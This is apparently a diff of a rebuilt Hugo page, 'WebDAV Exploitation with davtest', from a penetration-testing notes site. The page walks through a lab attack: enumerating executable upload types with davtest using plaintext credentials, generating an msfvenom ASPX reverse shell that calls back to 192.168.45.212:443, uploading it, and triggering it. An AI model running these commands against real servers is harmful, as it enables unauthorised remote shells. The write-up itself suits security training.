@@ -3,7 +3,7 @@
   <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
     <meta charset="utf-8">
     <meta name="viewport" content="height=device-height, width=device-width, initial-scale=1.0, minimum-scale=1.0">
-    <meta name="generator" content="Hugo 0.154.5">
+    <meta name="generator" content="Hugo 0.161.1">
     <meta name="generator" content="Relearn 9.0.3+36307e4ed23582638ab689240ac7b427217803ee">
     <meta name="description" content="WebDAV Exploitation WebDAV (Web Distributed Authoring and Versioning) is an HTTP extension that allows clients to perform remote file operations on a web server. When misconfigured, it can be a powerful attack surface — especially if it requires only basic credentials or has loose upload restrictions.
 WebDAV typically requires credentials to interact with.
@@ -36,27 +36,28 @@ Step 1 — Enumerate Allowed File Types with davtest davtest tests which file ty
     <meta itemprop="wordCount" content="230">
     <meta itemprop="keywords" content="Webdav,Davtest">
     <title>WebDAV Exploitation with davtest :: Zenu</title>
-    <link href="/images/favicon.png?1779778938" rel="icon" type="image/png">
-    <link href="/css/auto-complete/auto-complete.min.css?1779778938" rel="stylesheet">
-    <script src="/js/auto-complete/auto-complete.min.js?1779778938" defer></script>
-    <script src="/js/search-lunr.js?1779778938" defer></script>
-    <script src="/js/search.js?1779778938" defer></script>
+    <link href="/images/favicon.png?1784855724" rel="icon" type="image/png">
+    <link href="/images/favicon.ico?1784855724" rel="icon" type="image/x-icon" sizes="any">
+    <link href="/css/auto-complete/auto-complete.min.css?1784855724" rel="stylesheet">
+    <script src="/js/auto-complete/auto-complete.min.js?1784855724" defer></script>
+    <script src="/js/search-lunr.js?1784855724" defer></script>
+    <script src="/js/search.js?1784855724" defer></script>
     <script>
       window.relearn = window.relearn || {};
-      window.relearn.index_js_url="/searchindex.en.js?1779778938";
+      window.relearn.index_js_url="/searchindex.en.js?1784855724";
     </script>
-    <script src="/js/lunr/lunr.min.js?1779778938" defer></script>
-    <script src="/js/lunr/lunr.stemmer.support.min.js?1779778938" defer></script>
-    <script src="/js/lunr/lunr.multi.min.js?1779778938" defer></script>
-    <script src="/js/lunr/lunr.en.min.js?1779778938" defer></script>
+    <script src="/js/lunr/lunr.min.js?1784855724" defer></script>
+    <script src="/js/lunr/lunr.stemmer.support.min.js?1784855724" defer></script>
+    <script src="/js/lunr/lunr.multi.min.js?1784855724" defer></script>
+    <script src="/js/lunr/lunr.en.min.js?1784855724" defer></script>
     <script>
       window.relearn = window.relearn || {};
       window.relearn.contentLangs=['en'];
     </script>
-    <link href="/fonts/fontawesome/css/all.min.css?1779778938" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/all.min.css?1779778938" rel="stylesheet"></noscript>
-    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1779778938" rel="stylesheet">
-    <link href="/css/theme.css?1779778938" rel="stylesheet">
-    <link href="/css/format-html.css?1779778938" rel="stylesheet" id="R-format-style">
+    <link href="/fonts/fontawesome/css/all.min.css?1784855724" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/all.min.css?1784855724" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1784855724" rel="stylesheet">
+    <link href="/css/theme.css?1784855724" rel="stylesheet">
+    <link href="/css/format-html.css?1784855724" rel="stylesheet" id="R-format-style">
     <script>
       window.relearn = window.relearn || {};
       // configuration
@@ -174,7 +175,7 @@ Step 1 — Enumerate Allowed File Types with davtest davtest tests which file ty
 <p>WebDAV typically requires <strong>credentials</strong> to interact with.</p>
 <h2 id="step-1--enumerate-allowed-file-types-with-davtest">Step 1 — Enumerate Allowed File Types with davtest<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
 <p><code>davtest</code> tests which file types can be uploaded and executed on the target WebDAV server.</p>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>davtest -auth fmcsorley:CrabSharkJellyfish192 -sendbd auto -url http://192.168.158.122</span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>davtest -auth fmcsorley:CrabSharkJellyfish192 -sendbd auto -url http://192.168.158.122</span></span></code></pre></div>
 <div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code>Created: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd
 PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.shtml
 PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.txt
@@ -194,10 +195,10 @@ Executes: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.
 <p>The output shows both <code>.aspx</code> and <code>.asp</code> are executable — meaning we can upload a web shell or reverse shell payload in either format.</p>
 <h2 id="step-2--generate-a-reverse-shell-payload">Step 2 — Generate a Reverse Shell Payload<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
 <p>Using <code>msfvenom</code>, generate an ASPX reverse shell:</p>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/x64/shell_reverse_tcp -f aspx -o rev.aspx LHOST<span style="color:#f92672">=</span>192.168.45.212 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span></span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/x64/shell_reverse_tcp -f aspx -o rev.aspx LHOST<span style="color:#f92672">=</span>192.168.45.212 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span></span></span></code></pre></div>
 <h2 id="step-3--upload-the-payload">Step 3 — Upload the Payload<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
 <p>Upload the payload using the directory that <code>davtest</code> created in step 1:</p>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>davtest -auth fmcsorley:CrabSharkJellyfish192 -uploadfile rev.aspx -uploadloc DavTestDir_LOqKQmYZCD2Fd -url http://192.168.158.122</span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>davtest -auth fmcsorley:CrabSharkJellyfish192 -uploadfile rev.aspx -uploadloc DavTestDir_LOqKQmYZCD2Fd -url http://192.168.158.122</span></span></code></pre></div>
 <h2 id="step-4--trigger-the-shell">Step 4 — Trigger the Shell<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
 <p>With a listener ready, browse to the uploaded file to execute it:</p>
 <div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code>http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/rev.aspx</code></pre></div>
@@ -303,8 +304,8 @@ Executes: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.
 <div id="R-footer" class="default-animation"><p>Built with <a href="https://github.com/McShelby/hugo-theme-relearn" title="love"><i class="fas fa-heart"></i></a> by <a href="https://gohugo.io/">Hugo</a></p></div>
       </div>
     </aside>
-    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1779778938" defer></script>
-    <script src="/js/theme.js?1779778938" defer></script>
+    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1784855724" defer></script>
+    <script src="/js/theme.js?1784855724" defer></script>
     <div id="toast-container" role="status" aria-live="polite" aria-atomic="false"></div>
   </body>
 </html>
